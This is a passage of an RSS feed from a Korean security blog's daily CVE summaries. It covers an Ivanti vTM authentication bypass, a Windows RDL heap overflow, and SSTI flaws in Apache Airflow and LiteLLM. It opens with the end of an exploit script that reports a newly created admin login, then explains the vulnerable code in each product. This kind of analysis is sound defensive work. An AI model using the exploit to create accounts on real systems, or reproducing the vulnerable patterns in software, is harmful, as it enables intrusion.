&#xACC4;&#xC815; &#xC0DD;&#xC131;&#xC744; &#xC704;&#xD55C; &#xC815;&#xBCF4;&#xB4E4;&#xC744; &#xB123;&#xACE0; post &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">content = r.content.decode(<span class="hljs-string">&apos;utf-8&apos;</span>)print(content)<span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&apos;&lt;title&gt;2&lt;&apos;</span> <span class="hljs-keyword">in</span> content:    print(<span class="hljs-string">&quot;New user request sent&quot;</span>)    print(<span class="hljs-string">&quot;Login with username &apos;&quot;</span> + new_admin_name + <span class="hljs-string">&quot;&apos; and password &apos;&quot;</span> + new_admin_password + <span class="hljs-string">&quot;&apos;&quot;</span>)<span class="hljs-keyword">else</span>:    print(<span class="hljs-string">&quot;Unable to create new user&quot;</span>)</code></pre><p>&#xB9AC;&#xC2A4;&#xD3F0;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; &#xACC4;&#xC815; &#xC0DD;&#xC131;&#xC774; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD588;&#xB294;&#xC9C0; &#xD655;&#xC778; &#xD6C4; &#xC0DD;&#xC131;&#xD55C; &#xACC4;&#xC815;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB85C;&#xADF8;&#xC778;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/Ivanti/">Ivanti</category>
      
      <category domain="https://hackyboiz.github.io/tags/Virtual-Traffic-Manager/"> Virtual Traffic Manager</category>
      
      <category domain="https://hackyboiz.github.io/tags/vTM/">vTM</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-7593/">CVE-2024-7593</category>
      
      <category domain="https://hackyboiz.github.io/tags/vADC/">vADC</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/17/j0ker/2024-08-17/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-38077: Windows Remote Desktop Licensing Service의 Heap-based Buffer Overflow로 인한 PreAuth RCE 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/14/pwndorei/2024-08-14/</link>
      <guid>https://hackyboiz.github.io/2024/08/14/pwndorei/2024-08-14/</guid>
      <pubDate>Wed, 14 Aug 2024 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/CloudCrowSec001/CVE-2024-38077-POC/blo</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/CloudCrowSec001/CVE-2024-38077-POC/blob/main/CVE-2024-38077.md">https://github.com/CloudCrowSec001/CVE-2024-38077-POC/blob/main/CVE-2024-38077.md</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38077">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38077</a></p><ul><li>Windows Server 2016 &lt; 10.0.14393.7159</li><li>Windows Server 2019 &lt; 10.17763.6054</li><li>Windows Server 2022 23H2 &lt; 10.0.25398.1009</li><li>Windows Server 2022 &lt; 10.0.20384.2582</li><li>&#x2026;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC6D0;&#xACA9; &#xB370;&#xC2A4;&#xD06C;&#xD1B1; &#xB77C;&#xC774;&#xC120;&#xC2F1;(RDL) &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC6D0;&#xACA9; &#xB370;&#xC2A4;&#xD06C;&#xD1B1; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xB300;&#xD55C; &#xB77C;&#xC774;&#xC120;&#xC2A4;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xACE0; &#xBC1C;&#xAE09;&#xD558;&#xC5EC; &#xC6D0;&#xACA9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; &#xB370;&#xC2A4;&#xD06C;&#xD1B1;&#xC5D0; &#xB300;&#xD55C; &#xC548;&#xC804;&#xD55C; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xBCF4;&#xC7A5;&#xD558;&#xB294; Windows Server&#xC758; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;.</p><p>RDL &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC6D0;&#xACA9; &#xB370;&#xC2A4;&#xD06C;&#xD0D1; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xB110;&#xB9AC; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC73C;&#xBA70; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xB3D9;&#xC2DC;&#xC5D0; &#xB450; &#xAC1C;&#xC758; &#xC138;&#xC158;&#xC744; &#xD5C8;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. 3&#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xC138;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC2F6;&#xB2E4;&#xBA74; &#xB77C;&#xC774;&#xC120;&#xC2A4;&#xB97C; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xAD6C;&#xB9E4;&#xD574;&#xC57C;&#xD558;&#xACE0; RDL &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xB77C;&#xC774;&#xC120;&#xC2A4;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Terminal Service Licensing Procedure&#xB294; &#xC720;&#xC800;&#xB098; &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xC11C;&#xBC84;&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB418;&#xB294; Terminal Server CAL(Client Access Lisence)&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB514;&#xC790;&#xC778;&#xB418;&#xC5C8;&#xB294;&#xB370; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xC544;&#xB798;&#xC758; <code>CDataCoding::DecodeData</code>&#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">CDataCoding::DecodeData</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;CDataCoding *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">const</span>&#xA0;<span class="hljs-keyword">unsigned</span>&#xA0;__int16 *a2,</span></span><span class="hljs-function"><span class="hljs-params">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">unsigned</span>&#xA0;__int8 **a3,</span></span><span class="hljs-function"><span class="hljs-params">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">unsigned</span>&#xA0;<span class="hljs-keyword">int</span>&#xA0;*a4)</span></span><span class="hljs-function"></span>{&#xA0;&#xA0;<span class="hljs-comment">// ...</span>&#xA0;&#xA0;v4 =&#xA0;<span class="hljs-number">0</span>;&#xA0;&#xA0;v8 =&#xA0;<span class="hljs-number">0</span>;&#xA0;&#xA0;<span class="hljs-keyword">if</span>&#xA0;( a3 )&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;v9 = dwBytes;<span class="hljs-comment">//[1]</span>&#xA0;&#xA0;&#xA0;&#xA0;*a3 =&#xA0;<span class="hljs-number">0</span>i64;&#xA0;&#xA0;&#xA0;&#xA0;*a4 =&#xA0;<span class="hljs-number">0</span>;&#xA0;&#xA0;&#xA0;&#xA0;ProcessHeap = GetProcessHeap();&#xA0;&#xA0;&#xA0;&#xA0;v11 = (<span class="hljs-keyword">unsigned</span>&#xA0;__int8 *)HeapAlloc(ProcessHeap,&#xA0;<span class="hljs-number">8u</span>, v9);<span class="hljs-comment">//[2]</span>&#xA0;&#xA0;&#xA0;&#xA0;v12 = v11;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">if</span>&#xA0;( v11 )&#xA0;&#xA0;&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;memset_0(v11,&#xA0;<span class="hljs-number">0</span>, (<span class="hljs-keyword">unsigned</span>&#xA0;<span class="hljs-keyword">int</span>)dwBytes);&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">while</span>&#xA0;( *a2 )<span class="hljs-comment">//[3]</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-comment">// Str is BCDFGHJKMPQRTVWXY2346789</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-comment">// a2 is user-controlled buffer</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v13 = wcschr_0(Str, *a2);&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">if</span>&#xA0;( !v13 )&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v4 =&#xA0;<span class="hljs-number">13</span>;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v18 = GetProcessHeap();&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;HeapFree(v18,&#xA0;<span class="hljs-number">0</span>, v12);&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">return</span>&#xA0;v4;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-comment">// here change the integer a2 from base 24 to base 10</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-comment">// but does not check the length of a2</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v14 = v13 - Str;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v15 = v12;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v16 = (<span class="hljs-keyword">unsigned</span>&#xA0;<span class="hljs-keyword">int</span>)(v8 +&#xA0;<span class="hljs-number">1</span>);&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">do</span>{&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v17 = dword_1800D61C8 * *v15 + v14;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;*v15++ = v17;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;LODWORD(v14) = v17 &gt;&gt;&#xA0;<span class="hljs-number">8</span>;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;--v16;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;}<span class="hljs-keyword">while</span>&#xA0;( v16 );&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">if</span>&#xA0;( (_DWORD)v14 )&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;v12[++v8] = v14;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;++a2;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;*a4 = dwBytes;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;*a3 = v12;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">else</span>&#xA0;&#xA0;&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">return</span>&#xA0;<span class="hljs-number">8</span>;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;}&#xA0;&#xA0;<span class="hljs-keyword">else</span>&#xA0;&#xA0;{&#xA0;&#xA0;&#xA0;&#xA0;<span class="hljs-keyword">return</span>&#xA0;<span class="hljs-number">87</span>;&#xA0;&#xA0;}&#xA0;&#xA0;<span class="hljs-keyword">return</span>&#xA0;v4;}</code></pre><p>[1]&#xC5D0;&#xC11C; <code>v9</code>&#xC5D0; &#xAC12;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>dwbytes</code>&#xB294; &#xC544;&#xB798;&#xC758; <code>CDataCoding::SetInputEncDataLen</code>&#xD568;&#xC218;&#xC5D0;&#xC11C; &#xAC12;&#xC774; 21&#xB85C; &#xC124;&#xC815;&#xB41C; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">CDataCoding::SetInputEncDataLen</span><span class="hljs-params">(CDataCoding *<span class="hljs-keyword">this</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  <span class="hljs-comment">// ...</span>  dword_1800D61D0 = <span class="hljs-number">35</span>;  v1 = log10_0((<span class="hljs-keyword">double</span>)dword_1800D61C8) * <span class="hljs-number">35.0</span>;  v2 = v1 / log10_0(<span class="hljs-number">2.0</span>);  v3 = (<span class="hljs-keyword">int</span>)v2 + <span class="hljs-number">1</span>;  v4 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( v2 &lt;= (<span class="hljs-keyword">double</span>)(<span class="hljs-keyword">int</span>)v2 )    v3 = (<span class="hljs-keyword">int</span>)v2;  LOBYTE(v4) = (v3 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span>;  LODWORD(dwBytes) = (v3 &gt;&gt; <span class="hljs-number">3</span>) + v4; <span class="hljs-comment">// dwBytes is a fixed value 21</span>}</code></pre><p>&#xC774;&#xD6C4; [2]&#xC5D0;&#xC11C; 21 &#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC758; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xACE0; [3]&#xC758; <code>while</code> &#xB8E8;&#xD504;&#xC5D0;&#xC11C; 24&#xC9C4;&#xC218; &#xC22B;&#xC790;&#xAC00; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294; <code>a2</code>&#xB97C; 10&#xC9C4;&#xC218;&#xB85C; &#xBCC0;&#xD658;&#xD574;&#xC11C; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC81C;&#xACF5;&#xD55C; &#xB370;&#xC774;&#xD130;&#xC778; <code>a2</code>&#xC758; &#xAE38;&#xC774;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; Heap Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xACE0; &#xC774;&#xB294; &#xC778;&#xC99D; &#xACFC;&#xC815; &#xC774;&#xC804;&#xC5D0; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; &#xD1B5;&#xD574; Preauth RCE&#xAC00; &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap-buffer-overflow/">heap buffer overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/RDP/">RDP</category>
      
      <category domain="https://hackyboiz.github.io/tags/MadLicense/">MadLicense</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/14/pwndorei/2024-08-14/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-39877: Apache Airflow RCE 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/10/l0ch/2024-08-10/</link>
      <guid>https://hackyboiz.github.io/2024/08/10/l0ch/2024-08-10/</guid>
      <pubDate>Sat, 10 Aug 2024 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.securelayer7.net/arbitrary-code-execution-in</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/">https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Airflow 2.4.0 ~ 2.9.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>workflow &#xC791;&#xC131;, &#xC2A4;&#xCF00;&#xC904;&#xB9C1; &#xBC0F; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xD50C;&#xB7AB;&#xD3FC;&#xC778; Apache Airflow&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; SSTI &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Apache Airflow&#xB294; &#xAD00;&#xACC4;&#xC131; &#xBC0F; &#xC758;&#xC874;&#xC131;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xC791;&#xC5C5; &#xCEEC;&#xB809;&#xC158;&#xC744; DAG(Directed Acyclic Graph) &#xADF8;&#xB798;&#xD504;&#xB85C; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/10/l0ch/2024-08-10/image1.png" alt="image.png"></p><p>DAG&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; python &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C; &#xC815;&#xC758;&#xB418;&#xBA70;, &#xC720;&#xC800;&#xAC00; DAG&#xB97C; &#xC124;&#xBA85;&#xD558;&#xB294; <a href="https://www.astronomer.io/docs/learn/custom-airflow-ui-docs-tutorial?tab=TaskFlowAPI#step-2-create-a-new-dag">markdown &#xBB38;&#xC11C;</a>&#xB97C; &#xCD94;&#xAC00;&#xD560;&#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. markdown &#xBB38;&#xC11C;&#xB294; DAG&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xC5D0;&#xC11C; Airflow &#xC6F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0; &#xB80C;&#xB354;&#xB9C1;&#xB418;&#xC5B4; &#xCD9C;&#xB825;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC720;&#xC800;&#xAC00; &#xCD94;&#xAC00;&#xD55C; markdown&#xC744; Airflow &#xC6F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0; &#xB80C;&#xB354;&#xB9C1;&#xD560;&#xB54C; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>get_doc_md</code> &#xBA54;&#xC11C;&#xB4DC;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_doc_md</span>(<span class="hljs-params">self, doc_md: str | None</span>) -&gt; str | <span class="hljs-keyword">None</span>:</span>    <span class="hljs-keyword">if</span> doc_md <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:        <span class="hljs-keyword">return</span> doc_md    env = self.get_template_env(force_sandboxed=<span class="hljs-literal">True</span>)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> doc_md.endswith(<span class="hljs-string">&quot;.md&quot;</span>):        template = jinja2.Template(doc_md)    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">try</span>:            template = env.get_template(doc_md)        <span class="hljs-keyword">except</span> jinja2.exceptions.TemplateNotFound:            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;&quot;&quot;</span><span class="hljs-string">            # Templating Error!</span><span class="hljs-string">            Not able to find the template file: `<span class="hljs-subst">{doc_md}</span>`.</span><span class="hljs-string">            &quot;&quot;&quot;</span>    <span class="hljs-keyword">return</span> template.render()</code></pre><p>&#xD574;&#xB2F9; &#xBA54;&#xC11C;&#xB4DC;&#xB294; <code>doc_md</code> &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; markdown &#xBB38;&#xC11C;&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. <code>doc_md</code> &#xD655;&#xC7A5;&#xBA85;&#xC774; <code>.md</code> &#xB85C; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; python&#xC758; &#xC6F9; &#xD15C;&#xD50C;&#xB9BF; &#xC5D4;&#xC9C4;&#xC778; <code>jinja2</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD15C;&#xD50C;&#xB9BF;&#xC744; &#xB9CC;&#xB4E4;&#xACE0;, <code>template.render()</code>&#xB97C; &#xD1B5;&#xD574; &#xB80C;&#xB354;&#xB9C1;&#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xB9AC;&#xD134;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xB54C; <code>doc_md</code>&#xC5D0; markdown &#xBB38;&#xBC95; &#xB300;&#xC2E0; &#xC784;&#xC758;&#xC758; jinja2 expression &#xB610;&#xB294; python &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xBA74; &#xB80C;&#xB354;&#xB9C1; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC5B4;&#xB5A0;&#xD55C; &#xAC80;&#xC99D;&#xB3C4; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; <code>template.render()</code>&#xC758; &#xB80C;&#xB354;&#xB9C1; &#xACFC;&#xC815;&#xC5D0;&#xC11C; SSTI&#xB97C; &#xD1B5;&#xD55C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/10/l0ch/2024-08-10/image2.png" alt="image.png"></p><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58;&#xB294; <code>doc_md</code>&#xB97C; raw data&#xB85C; &#xC77D;&#xB294; &#xAC83;&#xC73C;&#xB85C; makrdown &#xB0B4; &#xD3EC;&#xD568;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xB80C;&#xB354;&#xB9C1;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/SSTI/">SSTI</category>
      
      <category domain="https://hackyboiz.github.io/tags/Apache-Airflow/">Apache Airflow</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/10/l0ch/2024-08-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-2952: LiteLLM의 SSTI 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/07/ogu123/cve-2024-2952/</link>
      <guid>https://hackyboiz.github.io/2024/08/07/ogu123/cve-2024-2952/</guid>
      <pubDate>Wed, 07 Aug 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.huntr.com/server-side-template-injection-con</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.huntr.com/server-side-template-injection-contributor-blog">https://blog.huntr.com/server-side-template-injection-contributor-blog</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>LiteLLM &lt; 1.34.42</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB2E4;&#xC591;&#xD55C; LLM API&#xB97C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0; &#xD1B5;&#xD569;&#xD558;&#xB294; LiteLLM &#xC194;&#xB8E8;&#xC158;&#xC5D0;&#xC11C; SSTI &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>hf_chat_template</code> &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C; <code>from_string</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD15C;&#xD50C;&#xB9BF;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs reasonml">def hf<span class="hljs-constructor">_chat_template(<span class="hljs-params">model</span>: <span class="hljs-params">str</span>, <span class="hljs-params">messages</span>: <span class="hljs-params">list</span>, <span class="hljs-params">chat_template</span>: Optional[Any] = None)</span>:    #<span class="hljs-operator"> ... </span>more code    env = <span class="hljs-constructor">Environment()</span>    env.globals<span class="hljs-literal">[&quot;<span class="hljs-identifier">raise_exception</span>&quot;]</span> = raise_exception    <span class="hljs-keyword">try</span>:        template = env.from<span class="hljs-constructor">_string(<span class="hljs-params">chat_template</span>)</span>    except Exception <span class="hljs-keyword">as</span> e:        raise e</code></pre><p><code>hf_chat_template</code> &#xBA54;&#xC18C;&#xB4DC;&#xB294; Hugging Face &#xBAA8;&#xB378;&#xC758; <code>tokenizer_config.json</code> &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628; <code>chat_template</code> &#xB9E4;&#xAC1C;&#xBCC0;&#xC218; &#xD1B5;&#xD574; 